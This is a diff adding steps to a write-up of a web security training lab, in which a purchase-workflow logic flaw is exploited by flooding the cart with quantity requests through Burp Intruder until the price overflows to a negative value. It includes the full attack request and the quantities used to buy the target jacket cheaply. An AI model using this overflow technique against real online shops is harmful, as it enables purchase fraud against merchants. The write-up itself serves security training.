@@ -9,6 +9,8 @@
   - [[#test-account][Test account]]
 - [[#end-goal][End Goal]]
 - [[#exploit][Exploit]]
+  - [[#request-on-intruder][Request on intruder]]
+  - [[#next-step][Next Step]]
 
 * Lab contain
 + Logic flaw in item purchasing workflow
@@ -18,3 +20,43 @@
 * End Goal
 + Exploit the flaw and buy "Lightweight l33t leather jacket"
 * Exploit
+- Access the lab
+- Login to account with credentials
+- Add targeted product to cart & send this request to repeater
+- Try to add 100 quantity of this product see that reponse, it gives an error =400 bad request: "Invalid parameter: quantity"=
+- So, we can not add more that 99 quantity of same product in cart
+- Now send this request to intruder
+** Request on intruder
+#+begin_src 
+POST /cart HTTP/2
+Host: 0ab900dc03193e9d8011622a0055000f.web-security-academy.net
+Cookie: session=WVtu3kKlcJITf3kqc2byIVQLbdUvExRp
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: https://0ab900dc03193e9d8011622a0055000f.web-security-academy.net
+Referer: https://0ab900dc03193e9d8011622a0055000f.web-security-academy.net/product?productId=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+productId=1&redir=PRODUCT&quantity=§99§ 
+#+end_src
+Start attack with =Null payloads= and from payload settings select =Continue indefinitely=
+- Go to cart page and refresh time to time to see the changes
+- See that price increasing with large quantity. But price suddenly switches to large negative number start counting up towards 0
+- Stop the attack
+  
+** Next Step
+- Clear the cart
+- Now create same intruder attack but generate exactly payload =323= and select Maximum concurrent request to 1
+- When attack finishes, go to =POST/cart= from repeater and send a single request for =47= jackets. Total price should be now =-$1221.96=
+- Now add another suitable prodcut to cart so that the total falls between 0 to 100
+- Place order to solve the lab
+  
